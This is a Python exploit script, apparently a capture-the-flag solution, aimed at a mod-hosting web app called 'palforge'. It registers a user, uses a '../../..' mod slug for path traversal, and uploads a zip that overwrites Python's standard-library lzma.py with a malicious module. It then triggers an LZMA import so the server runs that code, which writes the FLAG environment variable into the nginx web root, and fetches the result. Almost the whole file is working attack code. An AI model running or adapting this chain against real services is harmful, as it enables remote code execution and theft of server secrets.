import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE

u = "u%d"%random.randint(10000,99999); pw="pass12345"
requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
tok = pf.login(u,pw)

def write_stdlib(tok, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, "../../..", title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})

def trigger_lzma(tok):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_LZMA) as zf:
        zf.writestr("data.txt", b"hello lzma")
    bio.seek(0)
    pid = pf.create_platform(tok, "lzmatest%d"%random.randint(0,9999), name="z")
    mid = pf.create_mod(tok, "triglz%d"%random.randint(0,9999), title="z")
    bid = pf.create_build(tok, mid, pid)
    return requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/",
        headers={"Authorization":f"Bearer {tok}"},
        files={"zip_file":("p.zip", bio, "application/zip")}, timeout=20)

mal = b'import os\nopen("/usr/share/nginx/html/lzmark.txt","w").write("LZMA_IMPORTED\\n"+os.environ.get("FLAG","NOFLAG")+"\\n")\n'
r1 = write_stdlib(tok, "usr/lib/python3.11", "lzma.py", mal)
print("write lzma.py ->", r1.status_code)
r2 = trigger_lzma(tok)
print("lzma trigger ->", r2.status_code, r2.text[:100])
time.sleep(2)
try:
    c = requests.get(f"{BASE}/lzmark.txt", timeout=8)
    print("lzmark status:", c.status_code)
    print("body repr:", repr(c.content[:200]))
except Exception as e:
    print("lzmark err", e)
